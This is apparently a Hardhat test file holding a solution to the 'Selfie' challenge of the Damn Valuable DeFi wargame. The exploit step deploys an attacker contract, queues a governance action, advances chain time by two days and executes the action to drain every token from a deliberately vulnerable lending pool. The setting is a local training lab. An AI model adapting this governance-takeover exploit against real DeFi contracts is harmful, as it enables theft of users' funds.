const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Selfie', function () {
    let deployer, attacker;

    const TOKEN_INITIAL_SUPPLY = ethers.utils.parseEther('2000000'); // 2 million tokens
    const TOKENS_IN_POOL = ethers.utils.parseEther('1500000'); // 1.5 million tokens
    
    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const DamnValuableTokenSnapshotFactory = await ethers.getContractFactory('DamnValuableTokenSnapshot', deployer);
        const SimpleGovernanceFactory = await ethers.getContractFactory('SimpleGovernance', deployer);
        const SelfiePoolFactory = await ethers.getContractFactory('SelfiePool', deployer);

        this.token = await DamnValuableTokenSnapshotFactory.deploy(TOKEN_INITIAL_SUPPLY);
        this.governance = await SimpleGovernanceFactory.deploy(this.token.address);
        this.pool = await SelfiePoolFactory.deploy(
            this.token.address,
            this.governance.address    
        );

        await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.be.equal(TOKENS_IN_POOL);
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */
        // Deploy attacker contract and add SimpleGovernance events to it
        // This is needed to parse events in transaction receipts.
        const attacker_artifact = await hre.artifacts.readArtifact('SelfieAttacker');
        const governance_artifact = await hre.artifacts.readArtifact('SimpleGovernance');
        const abi = [
        ...attacker_artifact.abi, 
        ...governance_artifact.abi.filter((f) => f.type === 'event')
        ];
        const SelfieAttacker = new ethers.ContractFactory(abi, attacker_artifact.bytecode, attacker);
        const attack_contract = await SelfieAttacker.deploy(this.pool.address);

        // Queue the action
        const tx = await attack_contract.attack();

        // Retrieve the actionID in the transaction receipt
        const receipt = await tx.wait();
        const event = receipt.events.find(event => event.event === "ActionQueued");
        const actionId = event.args.actionId;

        // Retrieve the actionId in the event log
        /*
        // This would have to be used if the event was anonymous in the receipt.
        const eventFilter = this.governance.filters.ActionQueued(null, attack_contract.address);
        const events = await this.governance.queryFilter(eventFilter);
        expect(events).to.have.lengthOf(1);
        const actionId = events[0].args.actionId;
        // */

        // Retrieve the actionId in a callback
        /* 
        // With this solution we would need to process actionId in the callback.
        // Also we need to wait 4 seconds for the events to be polled:
        // https://github.com/ethers-io/ethers.js/issues/615#issuecomment-848991047
        this.governance.on("ActionQueued", (actionId, _) => { console.log(actionId); });
        await new Promise(res => setTimeout(res, 4000));
        // */

        // Wait for 2 days
        await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // 2 days

        // Execute the action
        await this.governance.connect(attacker).executeAction(actionId);
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.be.equal(TOKENS_IN_POOL);        
        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.be.equal('0');
    });
});
